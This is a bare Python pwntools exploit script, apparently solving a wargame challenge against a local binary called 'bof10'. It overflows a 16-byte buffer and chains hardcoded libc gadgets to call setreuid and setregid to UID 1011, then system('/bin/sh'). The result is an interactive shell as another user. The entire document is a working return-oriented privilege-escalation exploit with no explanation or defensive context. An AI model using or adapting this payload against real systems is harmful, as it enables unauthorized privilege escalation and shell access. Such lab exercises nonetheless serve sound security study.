#!/usr/bin/python3
from pwn import *
  
p = process('./bof10')
  
buf_to_return = 16
bof11_UID = 1011
poprdi_ret = 0x7ffff7a2e102
poprsi_ret = 0x7ffff7a2d2e8
setreuid = 0x7ffff7b0a190
setregid = 0x7ffff7b0a200
system = 0x7ffff7a52390
binsh = 0x7ffff7b99d57
  
payload = str.encode("A" * buf_to_return)
payload += p64(poprdi_ret) + p64(bof11_UID)
payload += p64(poprsi_ret) + p64(bof11_UID)
payload += p64(setreuid)
payload += p64(poprdi_ret) + p64(bof11_UID)
payload += p64(poprsi_ret) + p64(bof11_UID)
payload += p64(setregid)
payload += p64(poprdi_ret) + p64(binsh)
payload += p64(system)
p.send(payload)

p.interactive()